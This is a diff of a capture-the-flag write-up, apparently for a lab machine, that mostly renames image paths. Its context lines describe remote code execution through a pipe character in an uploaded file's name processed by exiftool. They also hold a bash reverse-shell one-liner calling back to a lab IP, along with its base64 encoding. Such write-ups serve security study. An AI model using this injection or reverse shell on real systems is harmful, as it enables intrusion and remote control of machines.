@@ -30,11 +30,11 @@ Clicking the big Go button reveals that we can upload a jpg file to the website 
 
 When I uploada file, it would produce a link to a report.
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 The file would be a .txt file of output from `exiftool` being used on the file.
 
-<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (18) (2).png" alt=""><figcaption></figcaption></figure>
 
 Very obviously, there is a JPG RCE vulnerability here. One possible parameter to inject commands in is the File Name. With the version, I found this vulnerability that allowed for RCE through the pipe character.
 
@@ -53,7 +53,7 @@ $ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.56/4444 0>&1"  ' | base64
 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ni80NDQ0IDA+JjEiICAK
 ```
 
-<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -105,7 +105,7 @@ I couldn't decode the base64 to get the file for some reason, so I ported the me
 
 When unzipped, we would get this MS Windows Vista Event Log.
 
-<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So the key here is to watch for logging and file transfers that are occurring. We can use this tool to dump the log file into a JSON file for easier reading.&#x20;
 
